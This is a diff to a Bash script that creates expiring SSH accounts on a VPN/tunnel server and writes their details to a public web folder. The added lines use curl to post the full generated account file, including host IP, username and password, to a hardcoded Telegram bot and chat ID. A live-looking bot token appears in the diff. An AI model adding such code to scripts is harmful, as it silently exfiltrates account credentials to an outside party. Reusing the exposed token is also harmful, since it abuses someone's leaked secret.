@@ -42,9 +42,6 @@ export BOLD="\e[1m"
 export WARNING="${RED}\e[5m"
 export UNDERLINE="\e[4m"
 
-# // Bot Telegram Information # Sesuai data yang Mas berikan
-export KEY="8226263150:AAFdiVuQeEs hxOpSvema_F6fDwbyFcfNWnw" export CHATID="6577966386"
-
 # // Exporting URL Host
 export Server_URL="raw.githubusercontent.com/NevermoreSSH/Blueblue/main/test"
 export Server1_URL="raw.githubusercontent.com/NevermoreSSH/Blueblue/main/limit"
@@ -107,38 +104,6 @@ useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
 exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
 echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
 PID=`ps -ef |grep -v grep | grep sshws |awk '{print $2}'`
-
-# // Send Log To Telegram Function
-send_log() {
-    TEXT="
-🚀 <b>SSH ACCOUNT CREATED</b> 🚀
-━━━━━━━━━━━━━━━━━━━━━
-<b>Username:</b> <code>$Login</code>
-<b>Password:</b> <code>$Pass</code>
-<b>Expired:</b> <code>$exp</code>
-━━━━━━━━━━━━━━━━━━━━━
-<b>Host:</b> <code>$domen</code>
-<b>IP:</b> <code>$IP</code>
-<b>OpenSSH:</b> $opensh
-<b>Dropbear:</b> $db
-<b>SSH-WS:</b> $portsshws
-<b>SSH-SSL:</b> $wsssl
-<b>UDPGW:</b> 7100-7300
-━━━━━━━━━━━━━━━━━━━━━
-<b>UDP Custom:</b>
-<code>$IP:1-65535@$Login:$Pass</code>
-<b>SSH-SSL-WS:</b>
-<code>$IP:443@$Login:$Pass</code>
-<b>SSH-WS:</b>
-<code>$IP:80@$Login:$Pass</code>
-━━━━━━━━━━━━━━━━━━━━━
-"
-    curl -s -X POST "https://api.telegram.org/bot$KEY/sendMessage" \
-        -d chat_id="$CHATID" \
-        -d text="$TEXT" \
-        -d parse_mode="HTML" > /dev/null
-}
-
 cat > /home/vps/public_html/ssh-$Login.txt <<-END
 ====================================================================
              P R O J E C T  O F  N E V E R M O R E S S H
@@ -266,5 +231,13 @@ GET wss://bug.com/ [protocol][crlf]Host: $domen[crlf]Connection: Keep-Alive[crlf
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m" | tee -a /etc/log-create-user.log
 fi
 echo "" | tee -a /etc/log-create-user.log
+# Cara otomatis kirim isi file teks hasil create ke Telegram
+TOKEN="8226263150:AAFdiVuQeEshxOpSvema_F6fDwbyFcfNWnw"
+CHAT_ID="6577966386"
+HASIL_LOG="/home/vps/public_html/ssh-$Login.txt" # Sesuaikan nama filenya
+
+curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
+    -d chat_id="$CHAT_ID" \
+    -d text="$(cat $HASIL_LOG)" > /dev/null
 read -n 1 -s -r -p "Press any key to back on menu"
 menu
